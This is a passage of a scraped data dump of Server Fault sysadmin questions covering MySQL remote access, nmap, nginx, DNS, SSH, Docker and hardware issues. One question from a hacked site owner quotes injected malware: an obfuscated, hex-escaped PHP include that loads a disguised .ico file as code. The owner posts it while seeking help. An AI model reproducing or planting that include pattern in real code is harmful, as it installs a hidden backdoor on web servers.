","<amazon-web-services>","2016-11-22 21:28:42"
"887866","Difference between local and remote nmap - trying to set up mysql server remote access","<p>I am try to set up mysql remotely. I have followed a number of guides such as <a href=""https://stackoverflow.com/questions/21627421/mysql-unable-to-connect-with-remote-server"">this</a>, and I have ended up using nmap to see what ports are open.</p>

<p>When I am on my laptop, <code>nmap -P0 &lt;server&gt;</code> gives:</p>

<pre><code>Nmap scan report for &lt;&gt; (ip.address.here)
Host is up (0.054s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
</code></pre>

<p>So it doesn't show port 3306 being open.</p>

<p>However on my server (Ubuntu 14.04), if I run <code>nmap -P0 localhost</code> I get the following:</p>

<pre><code>Nmap scan report for localhost (127.0.0.1)
Host is up (0.00064s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
</code></pre>

<p>Which implies that the port is open as it should be. What could be causing the discrepancy? (Admittedly this is my first time using nmap). Is this the reason I can't connect to my mysql server?</p>

<p>Additionally, from my laptop (windows using linux subsystem) <code>telnet &lt;host&gt; 3306</code> gives an error saying that the remote resource is not available.</p>
","<mysql><nmap>","2017-12-13 09:36:19"
"816579","Server 2016 standard RDS CAL","<p>I wonder if any of you know if there are separate OEM and OLP RDS CALs for server 2016?</p>

<p>Our distributor said that we will be able to use the OLP CALs on an OEM version of 2016 standard. Is this correct?</p>

<p>We got the following product codes quoted, but cannot really tell the difference besides 2 being USER and 2 being Device CALs:</p>

<p>6VC-03222</p>

<p>6VC-03224</p>

<p>6VC-01152</p>

<p>6VC-01149</p>
","<windows><windows-server-2016><cal>","2016-11-23 11:46:52"
"888131","Windows 10 update","<p>After install the big windows 10 update in December of 2017 by IIS stop to work and refuse to start. They are other services also that stopped (WAS) and also refuse to start. some one can help me please about how to resolve these issues?</p>
","<windows><iis><windows-update>","2017-12-14 13:27:35"
"888132","How to use a static IP from google cloud as a proxy in an ssh tunnel to 3rd party","<p>I need to setup a static IP for 3rd parties to whitelist, and I need to use that IP from my laptop to connect to that 3rd party using SFTP and / or SSH.</p>

<p>I'm thinking that I need to create a static IP in google cloud, and then somehow setup a proxy that use that IP outbound.</p>

<p>How can I possibly set that up in Google Cloud?</p>
","<proxy><google-cloud-platform><google-compute-engine><static-ip>","2017-12-14 13:34:13"
"888163","Root able to access tomcat server using localhost, regular user unable to access tomcat using localhost","<p>I have a Tomcat <code>8.5.x</code> web server running.</p>

<p>When I am logged in as root and open my web browser, I am able to navigate my tomcat web server pages using, for example, <code>localhost/index.html</code></p>

<p>However, if I am logged in as a regular user I get a server does not exist error using <code>localhost/index.html</code>, but if I put instead <code>[ipaddress]/index.html</code> I can navigate the web server.</p>

<p>What could be causing this issue? Also I can <strong>not</strong> post the configuration files for reasons outside of my control.</p>
","<configuration><tomcat>","2017-12-14 15:53:18"
"888364","Connecting to a TCP port by using valid IP address","<p>I have installed <code>Apache James</code> and I enabled smtp server on port 25. I can connect to port 25 inside the server by:</p>

<pre><code>telnet localhost 25
</code></pre>

<p>but I cannot connect from outside of the server, by this command:</p>

<pre><code>telnet validip 25
</code></pre>

<p>Inside the server I have this output for <code>netstat -a -n</code>:</p>

<pre><code>tcp6       0      0 :::25                   :::*                    LISTEN
</code></pre>

<p>How can I connect to the smtp server on port 25 from outside of the server by using valid IP address?</p>

<p>PS: the port is allowed in firewall and it is opened in the network. </p>

<pre><code>$ nmap validip
PORT    STATE  SERVICE
25/tcp  open   smtp
</code></pre>

<p>and inside the server:</p>

<pre><code># ufw status 
Status: active
To                         Action      From
--                         ------      ----
25/tcp                     ALLOW       Anywhere                  
25                         ALLOW       Anywhere                  
25/tcp (v6)                ALLOW       Anywhere (v6)             
25 (v6)                    ALLOW       Anywhere (v6)             
</code></pre>
","<linux><networking><smtp><port><tcp>","2017-12-15 19:27:37"
"816955","Modsecurity cookie match","<p>I run a small webhosting service (<code>CPanel</code> + <code>ModSecurity</code>) and I personnaly host few <code>laravel</code> projects on it. I noticed that when I (or anyone) visit multiple pages quickly (one after the other), at some point I get a <code>Too Many Redirects</code> error after the 6th or 7th visit (Redirected to <code>/</code>)</p>

<p>After few research, I noticed that it's due to a <code>ModSecurity</code> match on a cookie, and when it matches, the matched session is locked in this redirection loop until cookies are manually cleared (for that domain). Here is an extract of the <code>ModSecurity</code> logs showing the match and the response (<a href=""http://pastebin.com/FmYZKhN7"" rel=""nofollow noreferrer"">Pastebin</a>).</p>

<p>I don't get why it's matching ""sometimes"" (always when logged-in as a user), and how to prevent it. If you guys have an idea...</p>

<p>Thank you for your help</p>
","<mod-security><cookies><cpanel>","2016-11-24 23:29:02"
"816964","how to check if I can connect smtp.gmail.com?","<p>I have web application which I am setting up on a new vps. It is supposed to send email to the business owner whenever clients leave messages via the web-application. </p>

<p>Apparently, the VPS can not send emails for some reason (I tested it with a python script which working on anther VPS). I am looking for a way to confirm whether a network policy is stopping my vps to connect to smtp.gmail.com:587. Sth like nmap to make sure whether I am allowed to connect to smpt of gmail.</p>

<p>Please let me know your comments.</p>
","<email><ubuntu-16.04>","2016-11-25 01:12:21"
"888432","Multiple DNS to single IP","<p>I want to have 2 DNS pointing to single IP on different ports. Please let me known if it possible.
DNS 1 - abc.mydomain.com
DNS 2 - xyz.mydomain.com
What could be possible solution here. Can nginx help me on this.
Our DNS provider is godaddy</p>
","<dns-hosting>","2017-12-16 13:30:43"
"888472","dashboard to show eventlog errors, warnings (traces) etc.","<p>i'm after a dashboard (tfs?) to show what's currently going on with my MVC website. We write errors to the event log, and I duplicate that to a trace which I'm displaying 'live' with dbgview but I'm after something a bit more polished. What should I be using? thanks. </p>
","<iis><windows-event-log>","2017-12-16 20:26:27"
"888526","RemoteIPInternalProxy / RemoteIPTrustedProxy","<p>I guess I'm stupid or what but I don't get this:</p>

<p>I'm using the  <code>RemoteIPHeader X-Forwarded-For</code> within a VirtualHost configuration in order to determine GEO location of our users within our PHP application.</p>

<p>But I also would like to log the Remote IP of the clients within the apache logs.</p>

<p>The Apache combined log format looks like this:</p>

<pre><code>LogFormat ""%h (%{X-Forwarded-For}i) %l %u %t \""%r\"" %&gt;s %b \""%{Referer}i\"" \""%{User-Agent}i\"""" combined
</code></pre>

<p>According to documentation:</p>

<pre><code>RemoteIPTrustedProxy Directive
</code></pre>

<blockquote>
  <p>The RemoteIPTrustedProxy directive adds one or more addresses (or
  address blocks) to trust as presenting a valid RemoteIPHeader value of
  the useragent IP. Unlike the RemoteIPInternalProxy directive, any
  intranet or private IP address reported by such proxies, including the
  10/8, 172.16/12, 192.168/16, 169.254/16 and 127/8 blocks (or outside
  of the IPv6 public 2000::/3 block) are not trusted as the useragent
  IP, and are left in the RemoteIPHeader header's value.</p>
</blockquote>

<p>In my case the directive looks like this:</p>

<pre><code>RemoteIPTrustedProxy 172.31.0.0/16
</code></pre>

<p>Where I'm saying trust any PROXY forwarding from this local subnet.</p>

<p>BUT, when I set this Apache stops logging the remote IP because the forwarding proxy is valid now ?</p>

<p>So If I set:</p>

<pre><code>RemoteIPTrustedProxy 10.10.10.10 
</code></pre>

<p>The IP above doesn't exist. So the proxy servers from <code>172.31.0.0/16</code> are invalid now and therefore apache starts logging the remote IP header again?</p>

<p>Please, try to give me some guidance here, as obviously I don't understand this.</p>

<p>Thanks a lot !</p>
","<linux><apache-2.4><httpd.conf>","2017-12-17 11:40:56"
"817111","redirect www to http AND root to subdirectory in .htaccess","<p>Not sure I am posting at the right location :) </p>

<p>I want to be able for instance to redirect <a href=""http://www"">http://www</a>. example.com (with www) to http:// example.com/fr (without www, AND subdirectory)</p>

<p>Of course, I also want http:// example.com to redirect to http:// example.com/fr </p>

<p>What I have so far is this :</p>

<pre><code>RewriteBase / RewriteRule ^index\.php$ - [L] 
RewriteCond %{HTTP_HOST} ^www.example.com [NC]
RewriteRule ^(.*)$ example.com/fr/$1 [L,R=301,NC]
RewriteCond %{HTTP_HOST} ^example.com [NC] 
RewriteRule ^(.*)$ example.com/fr/$1 [L,R=301,NC]
</code></pre>

<p>It does a permanent loop though... 
How can I fix this ? </p>

<p>Thank you ! :)</p>
","<redirect>","2016-11-25 17:54:42"
"817143","Best software raid /filesystem for samba on linux","<p>I am running ubuntu 16.04 server and need to store files for a samba file server on a software raid. There are 4 500GB SSDs and stability / redundance / iops are of utmost importance.
I tried running zfs on linux for a while but samba acl settings and zfs seem to not be running stable together. With ext4 everything is fine.</p>

<p>Which software raid solution would you recommend? Does btrfs handle acls the same as ntfs? Or is mdadm raid5 with ext4 the safer bet? Any other solution worth mentioning?</p>

<p>A raid card is no option due to cost - there is no additional budget for this.</p>
","<raid><samba><zfs><access-control-list><btrfs>","2016-11-25 20:56:18"
"888732","Best way to prevent default server? (for HTTPS)","<p>In Nginx (https server), how can I reject all requests for my server's IP address that don't contain the real domain name? (I would like to stop script kiddies who scan every single IP address that Digital Ocean owns!)</p>

<p>I'm looking for the proper HTTPS way of answering <a href=""https://serverfault.com/questions/420351/best-way-to-prevent-default-server"">this</a> question which only works on pure HTTP.</p>

<p>Thank you!</p>
","<nginx><virtualhost>","2017-12-18 19:01:13"
"888738","Info about network adapters","<p>If possible, can I get some informations about how to find out my network adapters and some more stuff about them, such as MAC addresses, their manufacturers, how can I find out which network adapter has an active connection and how many IP addresses do they have, <strong><em>in cmd!</em></strong></p>

<p>Thanks! </p>
","<networking><adapter>","2017-12-18 19:38:04"
"817416","Are there any top like utilities for real time HTTP traffic analysis","<p>Near real time is also okay, I guess it will be possible say by parsing the access log continuously and show the real time status, e.g. most requested files, top remote ip.</p>

<p>I heard about these tool before but cannot remember the name of it. </p>

<p>Any one know?</p>
","<apache-2.2><nginx><log-files><apache2>","2016-11-28 08:54:05"
"888944","How to ssh through a proxy server, sometimes","<p>On my work laptop, if I need to SSH to a non-work machine, I need to go through a proxy server, but only when I'm on the work network (either in the office or on the VPN). I do this by setting a ProxyCommand line in my SSH config file. When I'm not in the office or on the WAN, though, I don't want to use the proxy. Is there an easy way to automate the decision to use or not use the proxy?</p>
","<ssh><proxy>","2017-12-19 23:24:07"
"888970","How do I use gmail mailbox with custom domain?","<p>So I have a mydomain.com registered in my name with godaddy. </p>

<p>There's also Gmail which we all love. </p>

<p>I would like to set up myfirstname@mydomain.com to be my email. Godaddy has an email solution, but it's ugly, slow and forwarding is messy. </p>

<p>I would like to set up an MX record which would point to Google servers so that everything sent to myfirstname@mydomain.com gets into my myfirstname.mylastname@gmail.com inbox. </p>

<p>Finding a list of Google's MX records <a href=""https://support.google.com/a/answer/33915?hl=en"" rel=""nofollow noreferrer"">is easy</a>. However, everything I find tells me how to set it up for G-suite. </p>

<p>I'm puzzled now - is it that Gmail doesn't allow you to do this? What needs to get configured on Gmail side so that it would know that myfirstname@mydomain.com needs to get to my @gmail.com mailbox? </p>

<p>Thanks!</p>
","<mx-record><gmail><godaddy>","2017-12-20 05:28:45"
"817508","AWS Reserved Instance","<p>I just bought a reserved EC2 instance. I can see it under the EC2 management console. But under the running instances i can't see any EC2 instance. How can i launch the reserved instance that i just bought ?<a href=""https://i.sstatic.net/WjME9.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/WjME9.png"" alt=""Reserved instances tab ""></a></p>

<h2>This is the running instances tab</h2>

<p><a href=""https://i.sstatic.net/EiuXv.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/EiuXv.png"" alt=""running instances tab ""></a></p>
","<amazon-ec2><amazon-web-services><reserved-instances>","2016-11-28 16:16:21"
"889038","Running Cron every 2 weeks on saturday","<p>we have a cron job that run every Saturday at 01:00 (0 1 * * 6) we want to modified to run every 2 weeks on Saturday at 01:00.</p>

<p>Thanks.</p>
","<linux><redhat><cron><zimbra>","2017-12-20 13:44:09"
"817647","vSphere and ESX License questions","<p>We currently have a ESX Environment  which has 1x Physical vSphere Server, 1x SAN (Another coming soon) 2x ESXi Hosts.</p>

<p>We currently have licensing for vSphere and ESX Essentials.</p>

<p>I need to add 2 more ESX Hosts and I know in Essentials / Essentials Plus there is a Max limit of 3 physical hosts.</p>

<p>I need to find out which version would be able to allow me to run vSphere server with 4x ESX Hosts. I have tried to find out for Standard Edition but a straight forward answer to this has alluded me and my Google searches. Are any of you able to help on this matter?</p>

<p>Thanks,</p>
","<vmware-vsphere><vmware-esx>","2016-11-29 11:06:29"
"817666","Block domain pointing to my website","<p>I am the owner of A media streaming website and I am facing an issue with other domains getting my website's content as it is and adding some links to it. I tried blocking it via <code>htaccess</code> through this line </p>

<pre><code>RewriteCond %{HTTP_HOST} !^mysite.com$
RewriteRule ^/?(.*) http://my site.com/$1 [QSA,R=301,L]
</code></pre>

<p>but it doesn't work. I also tried a verification of server HTTP <code>Host</code> via PHP but it made no change.</p>
","<http><domain>","2016-11-28 20:52:47"
"889245","Website hacked or has malware","<p>I developed a new website which I installed in a new server and just two days ago pointed the domain to that server. </p>

<p>However strange things are happening now such as index.html being renamed to index.html.bak.bak and index.php is appearing.</p>

<p>Following code is appearing in index.php and in existing index.php new code is being added such as :</p>

<p>php
 /<em>6e980</em>/</p>

<p>@include ""\x2fh\x6fm\x65/\x732\x61n\x61l\x79t\x69c\x73/\x70u\x62l\x69c\x5fh\x74m\x6c/\x54A\x53c\x65n\x61r\x69o\x2fQ\x75e\x72y\x2ff\x61v\x69c\x6fn\x5fa\x365\x399\x65.\x69c\x6f"";</p>

<p>/<em>6e980</em>/</p>

<p>echo file_get_contents('index.html.bak.bak');</p>

<p>Suddenly i observed a folder namely forum got created with a lone php file called 5w4xg.php. JQuery files are becoming blank or contains weird headers.</p>

<p>It is a linux server running on AWS. I think its either been hacked or has malware.</p>

<p>I am advised to 
 - Install SSL
 - Website can have SiteLock (<a href=""https://www.sitelock.com/"" rel=""nofollow noreferrer"">https://www.sitelock.com/</a>) for regular scan of website files and database.
 - Website can have Comodo Web Application firewall on the server which will prevent from SQL and XSS attacks.
 - Install ClamAV anti virus for cPanel.</p>

<p>While someone is saying on install SSL, ClamAV and Wordfence. </p>

<p>I don't know what to do ? </p>

<p>I also have following ports open : <BR>
TCP 21 0.0.0.0/0 <BR>
TCP 21 ::/0 <BR>
TCP 22 0.0.0.0/0<BR>
TCP 25 0.0.0.0/0 <BR>
TCP 25 ::/0 <BR>
TCP 53 0.0.0.0/0<BR> 
TCP 53 ::/0 <BR>
TCP 80 0.0.0.0/0<BR> 
TCP 80 ::/0 <BR>
TCP 110 0.0.0.0/0 <BR>
TCP 110 ::/0 <BR>
TCP 143 0.0.0.0/0<BR> 
TCP 143 ::/0 <BR>
TCP 443 0.0.0.0/0<BR> 
TCP 443 ::/0 <BR>
TCP 465 0.0.0.0/0<BR> 
TCP 465 ::/0 <BR>
TCP 587 0.0.0.0/0<BR> 
TCP 587 ::/0 <BR></p>

<p>I need ports only for :
a) uploading files from my workplace
b) connecting to MySQL db
c) mail system to work</p>

<p>Please advice what can I do and something that's involves minimal cost.</p>
","<linux><security><amazon-web-services>","2017-12-21 17:47:26"
"889396","ssl certificate for .ca and .com","<p>I have a mail server which has a domain pointer with a .ca and .com (ie. mail.example.com and mail.example.ca).  Is it possible to have an SSL certificate for each for that mail server?  I am running Qmail with an Apache Web server front.  I tried to put the SSL pointer for the secondary extension in it, but that did not work.  So, currently it is only running for the .com extension (for SSL).</p>
","<ssl><certificate>","2017-12-22 20:20:51"
"817927","Mount remote https volumes over https from command line","<p>My mailprovider (mail.com) offers free storage space. I would like to mount the storage in <code>/etc/fstab</code> on Linux, so that the storage comes up on boot.</p>

<p>It seems to be possible to mount the volume in windows (<code>Map network drive</code>) and MacOs (<code>Connect to server..</code>)</p>

<p>Which command should be invoked in <code>/etc/fstab</code> to automount the volume?
The storage address is '<a href=""https://storage-file-us.mail.com"" rel=""nofollow noreferrer"">https://storage-file-us.mail.com</a>'</p>
","<https><automount>","2016-11-30 15:30:15"
"818039","Install Os on remote server","<p>I just purchased vps. As per my requirement, I need <code>Centos 6</code> but they are providing <code>Centos 7</code>. So, is there any way by which I can install <code>Centos 6</code> on remote server ?</p>
","<centos6><remote-access>","2016-12-01 05:21:36"
"818068","Transportation Layer vs Network Layer","<p>I am a networking student, and I am learning about the OSI system for networks. The concepts for this system are all pretty complicated, but the main issue that I'm having is the main differences between the Networking Layer and the Transportation Layer. </p>

<p>In the video I was learning from (the Comptia Network+ videos on Cybrary), the instructor stated in the Networking Layer video that the main purpose of the Networking Layer is to split data into packets and send it across Networks. In the Transportation video, he says that the Transportation Layer is for creating packets as well. What are the differences between these two layers? I'm very confused, any help would be greatly appreciated. </p>
","<networking><packet>","2016-12-01 08:31:08"
"818319","Migrating large amount of data physically through disks over international borders","<p>I am not sure whether this is the right place to ask. We are moving some of our QA environments from the USA to our office in India. New servers that will be deployed in India will need to be loaded with Terabytes of data from the US. Transferring it over the internet will take weeks or months, so we are planning to load the data in a few large hard-drives and physically bringing it to India through Fedex/UPS. However, we are unsure of the legal formalities. Could someone provide a lead on the legal technicalities of sending such a good international borders, if there are any.</p>
","<migration>","2016-12-02 10:01:23"
"818415","8GB of ram OK for FreeNAS ZFS 6TBx2 in Raid 1","<p>Is 8gb's of ram ok for FreeNAS ZFS 6TBx2 in Raid 1 ?</p>

<p>Or does it have to be 16gb's ? </p>

<p>I only use this for home backup: images/videos/plex.</p>

<p>Thanks for any help.</p>
","<truenas>","2016-12-02 18:04:58"
"818455","Best way to monitor Windows server?","<p>I'm working at a company that provides our small business clients with IT support. One of my tasks is to perform service checks which includes checking the event viewer for critical errors/warnings as well as DHCP and DNS management consoles. The event viewer for the clients' workstations are also checked but not as regularly. </p>

<p>Is there an existing solution that can centralize viewing of all these logs so that I do not have to remotely access each server and do the same thing over and over for each client?</p>

<p>Each client has some version of Windows server - from 2003 to 2012 R2.</p>
","<windows-server-2008><active-directory><windows-server-2003><windows-server-2012-r2><system-monitoring>","2016-12-02 20:29:13"
"818567","502 Bad Gateway/ failed (111: Connection refused) while connecting to upstream","<p>I have the following docker-compose xml</p>

<pre><code>web:
  build: nginx/.
  container_name: nginx
  ports:
    - ""80:80""
  links:
    - ""openchain""
  restart: always
wallet:
  build: wallet/.
  container_name: wallet
  ports:
    - ""81:81""
  restart: always
  read_only: false
  volumes:
    - ./www:/usr/share/nginx/html:rw
  working_dir: /user/share/nginx/html
openchain:
  build: openchain/.
  ports:
    - ""8080""
  volumes:
    - ./data:/openchain/data
  restart: always
</code></pre>

<p>And the following conf for web and wallet respectively</p>

<pre><code>worker_processes 4;

events { worker_connections 1024; }

http {
    server {
        listen 80;

        location / {
            proxy_pass http://127.0.0.1:8080/;

            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection ""upgrade"";
        }
    }
}
</code></pre>

<p>and</p>

<p>worker_processes 4;</p>

<p>events { worker_connections 1024; }</p>

<p>http {</p>

<pre><code>server {
    listen 81;

    location / {
        root /usr/share/nginx/html;
    }
}
</code></pre>

<p>}</p>

<p>when I run docker ps I get</p>

<pre><code>    05e351c8f8db        openchain_web         ""nginx -g 'daemon off""   5 seconds ago       Up 5 seconds        0.0.0.0:80-&gt;80/tcp, 443/tcp    nginx
    e7401ea7c5bc        openchain_wallet      ""nginx -g 'daemon off""   5 seconds ago       Up 5 seconds        80/tcp, 443/tcp,
0.0.0.0:81-&gt;81/tcp   wallet
    40439fdb1c69        openchain_openchain   ""dotnet openchain.dll""   5 seconds ago       Up 5 seconds        0.0.0.0:32774-&gt;8080/tcp        openchain_openchain_1
</code></pre>

<p>But when I try to access the port openchain_openchain via proxy openchain_web I get the subject error</p>

<p>I'm new to docker so I'm not sure I'm proxying correctly with the nginx</p>

<p>Can you tell me what I did wrong?</p>

<p>P.S. I can access wallet just fine</p>
","<nginx><docker-compose><docker-machine>","2016-12-03 16:59:48"
"818914","ssh keys google cloud","<p>I'm trying to use google cloud to make my own SFTP server, the problem is I don't know how to properly use the ssh keys, everytime I try to connect with a ssh key the VM rejects it, any help?</p>

<p>I'm using PuTTYgen to generate keys and WinSCP to upload files on Windows clients, my VM is an Ubuntu server 14.04</p>

<p>Thank you all and sorry for my english.</p>
","<ubuntu-14.04><ssh-keys><google-cloud-platform>","2016-12-06 00:27:40"
"819017","How to Detect a visitor (client) DNS server IP using Logical methods","<p>I understand there is no way for a webserver to detect the DNS IP of an incoming request becuase that data is not stored in any packet option.  Raw TCP http data is all the webserver is use to seeing.   So my question is this - How can I integrate a healthcheck tool that will let the user know if he is configured with my DNS server as opposed to his ISP DNS.</p>

<p>I run my own DNS with a unique healcheck URL (ie. check.example.com)</p>

<p>This URL will respond with a 1.1.1.1 if Queried using my DNS and 127.0.0.1 if Queries using any outside DNS.</p>

<p>Given this advantage is there any sort of PHP script I can use to force the customers browser to perform a DNS Query using the client side environment then invoke a status message (success or fail) based on the response ?</p>
","<domain-name-system><php>","2016-12-06 14:10:36"
"819175","Would an extra gigabit ethernet card improve server performance","<p>my setup is the following:</p>

<p><strong>TP-Link TL-ER5120 Gigabit Load Balance Router</strong> </p>

<p>The router has 2 WANs and 3 LANs connected to it:</p>

<ul>
<li>LAN 1 Cable goes to a <strong>TP-Link SG-1024 Gigabit Switch (24 gigabit ports)</strong></li>
<li>LAN 2 Cable goes to a wireless router</li>
<li>LAN 3 Cable 3 goes to a wireless router</li>
</ul>

<p>So, my server is currently connected to the gigabit switch via 1 cable. The server is used by about 20 people for project management and ownCloud (file sharing). </p>

<p>Would it improve performance to add another gigabit ethernet card and connect it to the switch on another port?</p>

<p>NOTE: The load balancer sends all port 80 and 443 requests to the IP that the current network card has. If I add another card I wouldn't be able to redirect traffic from port 80 and 443 to it I think.</p>
","<performance><gigabit-ethernet>","2016-12-07 01:31:18"
"819268","Can we install and run VMware ESXi on a parallels server?","<p>I would like to install parallels and then install ESxi on top of it to get the distributed storage, Is this possible??. Is there any free tools available in VMWare o do the same?. I'm a newbie, need some guidance.</p>

<p>I would like to create a private cloud with multiple VM's in it, exploring all the options available.</p>
","<vmware-esxi><virtual-machines><vmware-vsphere><cloud-computing>","2016-12-07 13:26:56"
"819393","Pointing DNS to the Web","<p>So, I'm at my wits end here. I've been dealing with this issue off an on for months, and about a week this time around.</p>

<p>I have been using Fatcow as a Nameserver for some time, it started off as hosting; now all domains are parked and are hosted on site. Now, the only thing they host are the nameservers and email, both of which I'm working at getting off of.</p>

<p>I have a DNS on site that's been working; let me clarify, a 2008 R2 server. I have gone through both A-Name records and CNAME Records to get the DNS to be recognized by Fatcow and Name.com; with no avail on either. Both name.com and Fatcow give me an error when attempting to update the Nameservers. My firewall does have both TCP and UDP 53 forwarded.</p>

<p>The two things I can think of are: I'm not doing something right or; AT&amp;T U-verse has port 53 blocked, which is why I'm here. To get a fresh set of eyes.</p>

<p>With all the information, my question is: What am I missing? Based on everything I have done, have I missed something? I've searched and searched and find multiple questions regarding the general issue, but nothing specifically meets what I'm here asking now.</p>
","<domain-name-system><nameserver>","2016-12-07 21:29:47"
"819513","Linux server kiosk","<p>I want to build a dedicated machine I can use for testing candidates in our company.
The machine should run Linux with SSH server listening for connections.</p>

<p>I would like to send each candidate a user and password(the same one).</p>

<p>Upon connection, he will be presented with a message on how to proceed with the test and submit his work.
If he disconnect, all the changes will reverted, files, history, everything needs to be erased.</p>

<p>I will also like to support multiple users connecting with the same credentials. so I guess I need to implement some kind of virtualized environement that is created on the fly for each SSH connection.</p>

<p>There is actually an implementation of this in Internet war games ( such as this <a href=""http://overthewire.org/wargames/bandit/bandit0.html"" rel=""nofollow noreferrer"">http://overthewire.org/wargames/bandit/bandit0.html</a>)</p>

<p>Any idea on how to achieve that ?</p>
","<linux><ssh><virtual-machines><login-script>","2016-12-08 12:49:33"
"819586","I don't have KVM even though virtualization is enabled in BIOS","<p>My name is Philippe and I have a problem I thought you could help me with. When I try to create a new virtual machine in Virtual Machine Manager I get the following error:
“Warning: KVM is not available. This may mean the KVM package is not installed, or the KVM kernel modules are not loaded. Your virtual machines may perform poorly.”
when I run: # lsmod | grep kvm
all I get is: kvm 525259 0
I have a AMD A10-4600M APU with Radeon(tm) HD Graphics processor.
I downloaded all the necessary virtualization packages, I started libvirtd and enabled it as well.
I do not know what I’m not doing or what I’m doing wrong, my cpu supports virtualization and I made sure it is enabled in the BIOS but I do not know what kind of cpu RHEL7 requires for kvm or what I need to do to get this cpu to work with KVM.
I also ran the egrep ‘(vmx|svm)’ /proc/cpuinfo and received no output.
Please help me, I’m really trying to learn RedHat and pass my certifications but don’t want to keep getting frustrated.
Thank you, I appreciate your help!
Philippe</p>

<p>PS: I'm using CentOS7 in VirtualBox.</p>
","<centos7><rhel7>","2016-12-08 17:37:41"
"819622","What's the difference between Archive Software and Backup Software?","<p>I was reading <a href=""http://www.backupcentral.com/mr-backup-blog-mainmenu-47/13-mr-backup-blog/412-get-rid-of-tape-inconceivable.html"" rel=""nofollow noreferrer"">this article</a> when I came across this curious tid bit:</p>

<blockquote>
  <p>Think I'm exaggerating?  Just ask Morgan Stanley, who up until the mid
  00's used their backups as archives.  The SEC asked them for a bunch
  of emails, and their inability to retrieve those emails resulted in a
  $15M fine.  They also had a little over 1400 backup tapes that they
  needed months of time to be able to pull emails off of to satisfy an
  electronic discovery request from a major lawsuit from Coleman
  Holdings in 2005.  (They needed this time because they stored the data
  via backup software, not archive software.)  The judge said ""archive
  searches are quick and inexpensive. They do not cost 'hundred of
  thousands of dollars' or 'take several months.'""  (He obviously had
  never tried to retrieve emails off of backup tapes.)  He issued an
  adverse inference instruction to the jury that said that this was a
  ploy by Morgan Stanley to hide emails, and that they should take that
  into consideration in the verdict.  They did, and Morgan Stanley lost
  the case and Coleman Holdings was given a $1.57B judgment.</p>
</blockquote>

<p>So what's the difference between ""Archive Software"" and ""Backup Software"" and why are archive searches quick and inexpensive?  Was the judge right about this, or just confused?</p>
","<backup><archive>","2016-12-08 19:49:28"
"819721","Resetting network interfaces","<p>I am using vmware workstation to create virtual network. Many of the virtual machines are using 3-4 network interfaces. I also wanted to put ubuntu 9.10 OS in two different places. Hence I cloned ubuntu OS. After cloning network interface number in the new machine is starting from eth5. Is there any way to reset so that network interface number starts from eth0?</p>
","<networking><vmware-workstation><eth0>","2016-12-09 06:41:04"
"819746","SSH Connection refused after running pkill","<p>I have a Linux VPS and I just ran pkill to kill a user because I was not able to do usermod. But after I did that I wasn't able to login anymore on that user, so I googled a bit and saw some posts what said you just have to reboot. Thats what I did but I am still not able to connect, so I went over to my host and decided to restart the server, that didn't work either... I am able to connect via recovery mode but I just don't really know how to fix this.</p>

<p>Can someone help me out?</p>
","<linux><ssh><connection>","2016-12-09 08:55:27"
"819778","windows update service starts automatically after I've disabled it","<p>Since the microsoft fixes/updates on the servers in our organization are managed by another group via SCCM, I have disabled the Windows Update and the Background Intellingent Transfer services and deleted the C:\windows\software distribution\ in order to recover couple of Gigs.
The problem is the system starts automatically the services without human intervention.</p>

<p>Event viewer capture:
The Windows Update service entered the running state.
Log Name: System
Source: Service Control Manager
Event ID: 7036
OpCode: Info
Logged: 08/12/2016 15:32:06
Task Category: None
Keywords: Classic
Computer: CTX******</p>

<p>Does anyone knows why the services are switching to running state automatically and how to prevent this?</p>

<p>Thanks!</p>
","<windows><service><update>","2016-12-09 12:05:59"
"889581","How to generate a pem certificate? in an easy way, for testing","<p>A third-party app I have requires a *.pem certificate to be able to open a wss connection. How can I generate a *.pem file, keeping in mind that I need that only for testing, therefore I want an easy, not necessarily a really secure way to do so.</p>

<p>I'm on Arch Linux.</p>
","<ssl><ssl-certificate><certificate>","2017-12-25 15:27:03"
"889598","Second-hand Linksys WRT1900AC - security concerns?","<p>I purchased a second-hand Linksys WRT1900AC wireless router from some guy online. Is it safe to just hard-reset, plug in and configure? 
As far as I understand, it is a highly-customizable device which could potentially be running a modified firmware with some malicious functionality, like some sort of spyware. 
How hard/easy is it to install the ""original"" firmware on it?</p>
","<firmware><linksys>","2017-12-25 23:58:28"
"889638","Strange CPU usage when I touch (or a little shake)","<p>I've got a setup on a ASUS Z10-PAU8 MB and Xeon 1620 v4 + Corsair RMx 850W + 1 HDD + 1 SSD.</p>

<p>We noticed that, with the slightest touch (little shake the table where server temporarily lays) of the server, the CPU load is greatly increasing (99%) and sometimes its just hangs.</p>

<p>Continuing the investigation, we tried to shake it pretty hard and the indicator ""CATERR1"" on the motherboard up in red and server hangs.</p>

<p>In windows journal we have a lot of messages with ""WHEA Logger - Error type: Memory controller error"" when this happens. <a href=""https://i.sstatic.net/CQMj9.jpg"" rel=""nofollow noreferrer"">https://i.sstatic.net/CQMj9.jpg</a></p>

<p>We tried another DIMM module, no luck, same problem, pins on cpu socket all looks ok.</p>

<p>Well be glad if someone have any ideas about this behavior.</p>
","<central-processing-unit>","2017-12-26 10:52:29"
"889814","Why is My Network file Transfer Slower Than (What I Thought) it Should Be?","<p>I'm trying to copy a 40Gb 7zip archive within my network. </p>

<p>The computer sending has an <a href=""https://ark.intel.com/products/59482"" rel=""nofollow noreferrer""><strong>Intel Centrino 130</strong></a>, that's supposed to be 802.11 b/g/n compatible. The router is a <a href=""https://www.speedguide.net/routers/pace-4111n-wireless-n-adsl2-gateway-2995"" rel=""nofollow noreferrer""><strong>Pace 4111n</strong></a> which is also supposed to be wireless n; lastly, the receiving computer uses a usb wireless adapter, <a href=""http://www.tp-link.com/us/products/details/cat-5520_TL-WN722N.html"" rel=""nofollow noreferrer""><strong>TP-LINK WN722N</strong></a>, also wireless n.</p>

<p>With all of the devices wireless n capable, why is the file only copying at 2.7Mb / s? Since there's 8 bits to a byte, shouldn't it be copying the file around 18Mb/s? Is my math wrong?</p>
","<networking><wifi><file-transfer>","2017-12-28 00:18:25"
